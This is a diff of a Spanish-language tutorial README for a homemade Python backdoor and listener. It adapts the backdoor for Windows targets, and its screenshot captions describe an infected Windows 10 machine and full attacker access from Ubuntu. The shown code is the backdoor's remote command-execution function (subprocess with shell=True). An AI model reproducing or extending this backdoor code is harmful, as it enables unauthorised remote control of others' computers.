@@ -1044,18 +1044,31 @@ escuchar.run()
 
 
 
-# PROBAMOS EN WINDOWS 
+# BACKDOOR EN WINDOWS 
  
- * En windows solo tenemos que agregar .decode("windows-1252") valido en windows. a la siguente function > 
+ * En windows solo tenemos que agregar .decode("windows-1252") a la siguente function en backdoor.py > 
 
 # backdoor.py
 ```bash
  def ejecutar_comando(self,comando):
         return subprocess.check_output(comando,shell=True).decode("windows-1252")
+```
+
+# El resto del codigo sigue igual, tanto listener como backdoor.
+* Siempre respetando la ip, el listener y el backdoor apuntan donde va estar el listener.
+
+# Windows 10 (Target)
+
+![backdoor en windows](https://user-images.githubusercontent.com/97669969/157506726-ced0e594-c119-4996-b584-74293717e3e1.png)
+ * Backdoor corriendo correctamente, sistema infectado.
+
+# Ubuntu (Hacker)
+
+![backdoor en windows ubuntu](https://user-images.githubusercontent.com/97669969/157506923-f0d9b136-a183-4811-b549-8873cde3bec8.png)
+* Tenemos acceso total a la maquina.
 
 
-* El resto del codigo sigue igual, tanto listener como backdoor.
-# Siempre respetando la ip, el listener y el backdoor apuntan donde va estar el listener.
+
 
 
 
